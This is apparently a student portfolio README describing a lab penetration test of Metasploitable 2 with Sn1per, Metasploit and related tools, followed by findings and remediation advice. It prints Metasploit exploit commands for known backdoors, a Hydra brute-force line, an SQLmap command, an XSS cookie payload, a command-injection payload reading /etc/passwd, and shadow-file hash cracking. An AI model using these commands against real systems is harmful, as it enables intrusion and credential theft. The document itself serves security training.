# Penetration-Testing-with-Sn1per
Conducted comprehensive penetration testing against Metasploitable 2 (intentionally vulnerable machine) using Sn1per automated penetration testing framework. Successfully identified critical vulnerabilities including backdoors, misconfigured services, and weak credentials. 

## ⚠️ Ethical Disclaimer
**IMPORTANT:** This project was conducted in a completely isolated, controlled laboratory environment for educational purposes only. All testing was performed on Metasploitable 2, an intentionally vulnerable virtual machine designed for security training. No unauthorized access was attempted, and all activities complied with legal and ethical hacking standards.

**Legal Notice:**
- ✅ Testing conducted on personal lab equipment
- ✅ No real systems or networks were accessed
- ✅ Fully isolated virtual environment
- ✅ Educational purposes only
- ✅ Ethical hacking methodology followed

## 🎯 Project Objectives

### Primary Goals
✅ Conduct comprehensive vulnerability assessment using automated tools  
✅ Identify security weaknesses in legacy systems  
✅ Demonstrate exploitation techniques in controlled environment  
✅ Document findings with evidence and proof of concepts  
✅ Develop remediation recommendations  
✅ Practice ethical penetration testing methodology

### Learning Outcomes
- Master automated penetration testing tools (Sn1per)
- Understand common vulnerability categories (OWASP Top 10)
- Practice exploitation techniques safely
- Develop professional security assessment reports
- Learn defensive security through offensive testing

## 🛠️ Tools & Technologies

### Primary Tools

**Sn1per**
- **Purpose:** Automated penetration testing framework
- **Features:** 
  - Automated reconnaissance
  - Vulnerability scanning
  - Exploitation modules
  - Web application testing
  - Report generation
- **Version:** Kali Linux 2024.1

**Kali Linux**
- **Purpose:** Penetration testing platform
- **Version:** 2024.1
- **Components:** Full installation with all tools

**Metasploitable 2**
- **Purpose:** Intentionally vulnerable target system
- **OS:** Ubuntu 8.04 (outdated by design)
- **Purpose:** Security training and testing

### Supporting Tools

**Network Reconnaissance:**
- **Nmap** - Network scanner and port enumeration
- **Netdiscover** - ARP reconnaissance
- **DNSenum** - DNS enumeration

**Vulnerability Scanning:**
- **Nikto** - Web server vulnerability scanner
- **Dirb/Dirbuster** - Directory enumeration
- **WPScan** - WordPress vulnerability scanner

**Exploitation:**
- **Metasploit Framework** - Exploitation framework
- **SQLmap** - SQL injection exploitation
- **Hydra** - Password brute forcing
- **John the Ripper** - Password hash cracking
- **Burp Suite** - Web application testing

**Post-Exploitation:**
- **Meterpreter** - Post-exploitation framework
- **Linux Exploit Suggester** - Privilege escalation

**Analysis:**
- **Wireshark** - Network protocol analysis
- **Searchsploit** - Exploit database search

## 📋 Testing Methodology

### Phase 1: Information Gathering & Reconnaissance

**Objective:** Gather information about target system

**Activities:**
1. **Network Discovery**
```bash
   # Discover live hosts
   netdiscover -r 192.168.1.0/24
   
   # Target identified: 192.168.1.100
```

2. **Port Scanning**
```bash
   # Comprehensive scan
   nmap -sV -sC -p- -A -O 192.168.1.100 -oA metasploitable_scan
   
   # Results:
   # - 23 open ports
   # - 15+ services
   # - OS: Linux 2.6.x
```

3. **Service Enumeration**
   - FTP (21) - vsftpd 2.3.4
   - SSH (22) - OpenSSH 4.7p1
   - Telnet (23) - Linux telnetd
   - SMTP (25) - Postfix smtpd
   - HTTP (80) - Apache httpd 2.2.8
   - SMB (139/445) - Samba 3.0.20
   - MySQL (3306) - MySQL 5.0.51a

**Key Findings:**
- ✅ 23 open ports (excessive)
- ✅ Multiple outdated services
- ✅ Information disclosure
- ✅ Unnecessary services running

### Phase 2: Vulnerability Assessment

**Objective:** Identify security vulnerabilities

**Sn1per Automated Scan:**
```bash
# Full scan
sniper -t 192.168.1.100 -m normal

# Web application scan
sniper -t 192.168.1.100 -m web

# Stealth scan
sniper -t 192.168.1.100 -m stealth
```

**Vulnerability Summary:**

| Category | Count | Severity |
|----------|-------|----------|
| Remote Code Execution | 5 | Critical |
| Authentication Bypass | 3 | High |
| Information Disclosure | 8 | Medium |
| Privilege Escalation | 4 | High |
| Configuration Issues | 12 | Medium/Low |
| **TOTAL** | **32** | Mixed |

### Phase 3: Exploitation

**Objective:** Demonstrate vulnerability impact

#### Critical Vulnerability 1: vsftpd 2.3.4 Backdoor

**CVE:** CVE-2011-2523  
**CVSS Score:** 10.0 (Critical)

**Exploitation:**
```bash
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.100
exploit

# Result: Root shell obtained
```

**Impact:** 
- ✅ Remote root access
- ✅ No authentication required
- ✅ Complete system compromise

#### Critical Vulnerability 2: UnrealIRCd Backdoor

**CVE:** CVE-2010-2075  
**CVSS Score:** 10.0 (Critical)

**Exploitation:**
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 192.168.1.100
exploit

# Result: Remote shell obtained
```

#### Critical Vulnerability 3: Samba 3.0.20 RCE

**CVE:** CVE-2007-2447  
**CVSS Score:** 10.0 (Critical)

**Exploitation:**
```bash
use exploit/multi/samba/usermap_script
set RHOST 192.168.1.100
exploit

# Result: Root shell obtained
```

#### High Vulnerability 4: Distcc Daemon

**CVE:** CVE-2004-2687  
**CVSS Score:** 8.5 (High)

**Exploitation:**
```bash
use exploit/unix/misc/distcc_exec
set RHOST 192.168.1.100
exploit

# Result: User shell obtained
```

#### High Vulnerability 5: Tomcat Default Credentials

**Testing:**
```bash
# Password brute force
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /manager/html

# Found: admin:admin, tomcat:tomcat
```

**Impact:**
- ✅ Admin access to Tomcat
- ✅ WAR file upload capability
- ✅ Code execution possible

#### Web Vulnerabilities

**SQL Injection:**
```bash
# SQLmap
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1" --dbs

# Result: Database access successful
```

**Cross-Site Scripting (XSS):**
```javascript
// Stored XSS
<script>alert(document.cookie)</script>

// Result: Session hijacking possible
```

**Command Injection:**
```bash
# Command injection payload
127.0.0.1; cat /etc/passwd

# Result: File disclosure
```

### Phase 4: Post-Exploitation

**Objective:** Demonstrate potential damage

**Activities:**

1. **Privilege Escalation**
```bash
   # Find SUID binaries
   find / -perm -4000 2>/dev/null
   
   # Root access achieved
```

2. **Credential Harvesting**
```bash
   # Extract hashes
   cat /etc/shadow
   
   # Crack passwords
   john --wordlist=rockyou.txt shadow.txt
   
   # Result: 12 passwords cracked
```

3. **System Enumeration**
```bash
   # User accounts: 15 found
   # Network connections mapped
   # Sensitive files identified
```

4. **Persistence**
```bash
   # Backdoor user created
   # SSH key installed
   # Cron job backdoor
```

**Results:**
- ✅ Root access maintained
- ✅ 15 accounts compromised
- ✅ Persistence established
- ✅ Network mapped

### Phase 5: Documentation & Reporting

**Report Components:**
1. Executive Summary
2. Technical Findings
3. Evidence (screenshots)
4. Remediation Recommendations
5. Appendices

## 🎯 Findings Summary

### By Severity

**CRITICAL (5 vulnerabilities - CVSS 9.0-10.0)**

| Vulnerability | CVE | CVSS | Service | Impact |
|---------------|-----|------|---------|--------|
| vsftpd Backdoor | CVE-2011-2523 | 10.0 | FTP | Remote Root |
| UnrealIRCd Backdoor | CVE-2010-2075 | 10.0 | IRC | Remote Shell |
| Samba Usermap | CVE-2007-2447 | 10.0 | SMB | Remote Root |
| Java RMI RCE | CVE-2011-3556 | 9.3 | RMI | Remote Code |
| Bindshell 1524 | N/A | 10.0 | Bindshell | Root Shell |

**HIGH (5 vulnerabilities - CVSS 7.0-8.9)**

| Vulnerability | CVE | CVSS | Impact |
|---------------|-----|------|--------|
| Distcc RCE | CVE-2004-2687 | 8.5 | Remote Code |
| Default Creds | N/A | 8.0 | Admin Access |
| PostgreSQL Weak | N/A | 8.5 | DB Access |
| SSH Weak Config | N/A | 7.5 | Brute Force |
| NFS Misconfig | N/A | 7.8 | File Access |

**MEDIUM (14 vulnerabilities - CVSS 4.0-6.9)**
- SQL Injection (CVSS 6.5)
- XSS Multiple (CVSS 6.1)
- Command Injection (CVSS 6.3)
- Directory Traversal (CVSS 5.0)
- Information Disclosure (CVSS 5.3)
- Weak SSL/TLS (CVSS 5.9)
- And 8 more...

**LOW (8 vulnerabilities - CVSS 0.1-3.9)**
- Banner disclosure
- Default pages
- Unnecessary services
- And 5 more...

### Attack Statistics

**Reconnaissance:**
- **Ports Scanned:** 65,535
- **Open Ports:** 23
- **Services:** 15+
- **Time:** 30 minutes

**Exploitation:**
- **Attempts:** 30+
- **Successful:** 12
- **Root Access:** Yes (3 methods)
- **Time to Compromise:** 15 minutes
- **Time to Root:** 25 minutes

**Post-Exploitation:**
- **Accounts Found:** 15
- **Passwords Cracked:** 12 (80%)
- **Sensitive Files:** 200+
- **Backdoors:** 3 installed

## 🔐 Skills Demonstrated

### Technical Skills

**Network Security:**
- Network reconnaissance
- Port scanning
- Service enumeration
- Traffic analysis

**Vulnerability Assessment:**
- Automated scanning
- Manual validation
- False positive identification
- Risk prioritization

**Exploitation:**
- Remote code execution
- SQL injection
- Command injection
- XSS exploitation
- Password cracking

**Post-Exploitation:**
- Privilege escalation
- Credential harvesting
- System enumeration
- Persistence mechanisms

**Tool Proficiency:**
- Sn1per automation
- Metasploit Framework
- Nmap
- Burp Suite
- SQLmap
- Hydra/John the Ripper

### Analytical Skills
- CVE research
- CVSS scoring
- Risk assessment
- Attack path identification

### Professional Skills
- Technical report writing
- Executive summaries
- Evidence documentation
- Ethical practices

## 🛡️ Remediation Recommendations

### Immediate Actions (Within 24 Hours)

**1. Remove Backdoored Services**
```bash
# Remove vsftpd 2.3.4
apt-get remove vsftpd

# Remove UnrealIRCd
apt-get remove unrealircd

# Kill bindshell
netstat -tulpn | grep 1524
kill [PID]
```

**2. Patch Critical Vulnerabilities**
```bash
# Update Samba
apt-get update
apt-get install samba
# Minimum: 3.0.25+
```

**3. Change Default Credentials**
```bash
# Tomcat
# Edit tomcat-users.xml
# Create strong passwords

# MySQL
mysql -u root -p
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongP@ss!';
```

**4. Disable Unnecessary Services**
```bash
systemctl stop distcc telnet rsh
systemctl disable distcc telnet rsh
apt-get remove distcc telnet rsh-server
```

**5. Implement Firewall**
```bash
# Basic firewall rules
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow SSH only
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
```

### Short-Term (Within 1 Week)

**1. Patch All Systems**
- Update all software to latest versions
- Enable automatic security updates
- Subscribe to security mailing lists

**2. Implement Strong Authentication**
- Enforce complex password policy
- Deploy multi-factor authentication
- Implement account lockout policies
- Use SSH keys instead of passwords

**3. Network Segmentation**
- Separate production from development
- Implement VLANs
- Deploy DMZ for public services
- Restrict inter-VLAN routing

**4. Deploy Security Monitoring**
- Install and configure SIEM
- Enable comprehensive logging
- Set up alerts for suspicious activity
- Deploy intrusion detection system

**5. Web Application Security**
- Input validation on all forms
- Parameterized queries (prevent SQL injection)
- Output encoding (prevent XSS)
- Web application firewall (WAF)

### Long-Term (1-3 Months)

**1. Security Program**
- Establish vulnerability management program
- Regular penetration testing (quarterly)
- Security awareness training
- Incident response plan

**2. Secure Development**
- Secure coding training
- Code review process
- Security testing in CI/CD
- Threat modeling

**3. Access Control**
- Implement least privilege
- Role-based access control
- Regular access reviews
- Privileged access management

**4. Business Continuity**
- Regular backups (3-2-1 rule)
- Disaster recovery plan
- Backup testing
- High availability implementation

**5. Compliance**
- Security policy development
- Compliance framework (ISO 27001)
- Regular audits
- Documentation

## 🧪 Lab Environment

### Network Setup
```
Attack Machine: Kali Linux 2024.1
  - IP: 192.168.1.50
  - Tools: Sn1per, Metasploit, Nmap, Burp Suite

Target Machine: Metasploitable 2
  - IP: 192.168.1.100
  - OS: Ubuntu 8.04 (intentionally vulnerable)
  - Services: 23 open ports

Network: Isolated virtual network (NAT/Host-Only)
Hypervisor: VMware Workstation / VirtualBox
```

### Safety Measures
- ✅ Completely isolated from production networks
- ✅ No internet connectivity for target
- ✅ Host-only or NAT networking
- ✅ Snapshots before testing
- ✅ No real data on systems

## 📊 OWASP Top 10 Mapping

Found vulnerabilities mapped to OWASP Top 10:

- ✅ **A01:2021 - Broken Access Control**
  - Default credentials
  - Misconfigured NFS shares
  - Weak authentication

- ✅ **A02:2021 - Cryptographic Failures**
  - Cleartext passwords
  - Weak SSL/TLS
  - No encryption at rest

- ✅ **A03:2021 - Injection**
  - SQL injection
  - Command injection
  - LDAP injection

- ✅ **A05:2021 - Security Misconfiguration**
  - Default configurations
  - Unnecessary services
  - Verbose error messages

- ✅ **A06:2021 - Vulnerable Components**
  - Outdated software (vsftpd, Samba)
  - Known CVEs
  - End-of-life software

- ✅ **A07:2021 - Authentication Failures**
  - Weak passwords
  - No account lockout
  - Predictable credentials

- ✅ **A09:2021 - Security Logging Failures**
  - Insufficient logging
  - No monitoring
  - No alerting

## 🎓 Learning Outcomes

### Technical Knowledge
- Understanding of vulnerability lifecycle
- Exploitation techniques and methodology
- Post-exploitation procedures
- Defensive security mindset

### Tools Mastery
- Automated penetration testing with Sn1per
- Manual exploitation with Metasploit
- Web application testing with Burp Suite
- Network analysis with Nmap and Wireshark

### Methodology
- Structured penetration testing approach
- Ethical hacking principles
- Evidence collection and documentation
- Professional reporting

### Risk Assessment
- CVSS scoring understanding
- Business impact evaluation
- Prioritization of findings
- Remediation planning

## 📝 Lessons Learned

### What Worked Well
✅ Automated tools (Sn1per) quickly identified vulnerabilities  
✅ Metasploit simplified exploitation process  
✅ Systematic methodology ensured thorough coverage  
✅ Documentation captured all evidence

### Challenges
⚠️ False positives required manual validation  
⚠️ Some exploits required customization  
⚠️ Outdated target made some modern techniques irrelevant  
⚠️ Balancing depth vs. breadth of testing

### Key Takeaways
- **Defense in Depth:** Multiple layers of security needed
- **Patch Management:** Critical for preventing exploitation
- **Configuration:** Default/weak configs are low-hanging fruit
- **Monitoring:** Detection is crucial when prevention fails
- **Human Factor:** Social engineering is often easiest path

## 📚 References & Standards

### Penetration Testing Standards
- PTES (Penetration Testing Execution Standard)
- OWASP Testing Guide v4.0
- NIST SP 800-115 (Technical Security Testing)
- OSSTMM (Open Source Security Testing Methodology Manual)

### Vulnerability Databases
- CVE (Common Vulnerabilities and Exposures)
- NVD (National Vulnerability Database)
- Exploit-DB
- OWASP Top 10

### Tools Documentation
- Sn1per GitHub Repository
- Metasploit Unleashed
- Nmap Documentation
- OWASP ZAP User Guide

### Legal & Ethical Resources
- EC-Council Code of Ethics
- (ISC)² Code of Ethics
- Computer Fraud and Abuse Act (CFAA)
- UK Computer Misuse Act 1990

## ⚖️ Legal & Ethical Considerations

### Authorization
- ✅ Testing on owned/controlled systems only
- ✅ Written authorization before any testing
- ✅ Defined scope and boundaries
- ✅ Rules of engagement documented

### Responsible Disclosure
- Report vulnerabilities to vendors/owners
- Allow reasonable time for patching
- Do not publish exploits prematurely
- Follow coordinated vulnerability disclosure

### Professional Ethics
- Respect privacy and confidentiality
- Do no harm principle
- Act in good faith
- Maintain professional standards

### This Project
- ✅ Controlled lab environment only
- ✅ No real systems accessed
- ✅ Educational purposes only
- ✅ Ethical guidelines followed

## 🔗 Relation to Cybersecurity Career

### SOC Analyst
**Applicable Skills:**
- Understanding attacker techniques
- Log analysis from defender perspective
- Alert investigation procedures
- Incident classification

### Penetration Tester
**Core Skills:**
- Vulnerability assessment
- Exploitation techniques
- Report writing
- Client communication

### Security Engineer
**Relevant Knowledge:**
- Secure architecture design
- Control implementation
- Risk mitigation strategies
- Defense in depth

### Incident Responder
**Transferable Skills:**
- Attack path reconstruction
- Forensic evidence collection
- Threat hunting techniques
- Remediation planning

### Vulnerability Analyst
**Direct Application:**
- Vulnerability research
- CVE analysis
- CVSS scoring
- Patch prioritization

---

**Penetration Tester:** Oluwapelumi Fatoba  
**Project Duration:** 4 weeks (40 hours)  
**Environment:** Controlled laboratory  
**Methodology:** PTES + OWASP

**Contact:** pelumifatoba32@gmail.com  
**LinkedIn:** [linkedin.com/in/fatoba](https://linkedin.com/in/fatoba)  
**Portfolio:** [Your Netlify URL]

**Certifications:** Network Defense (Cisco), Cyber Threat Management (Cisco)

---

*This project demonstrates practical penetration testing skills in a controlled, ethical, and legal manner. All testing was conducted on intentionally vulnerable systems designed for security education. No unauthorized access was attempted.*
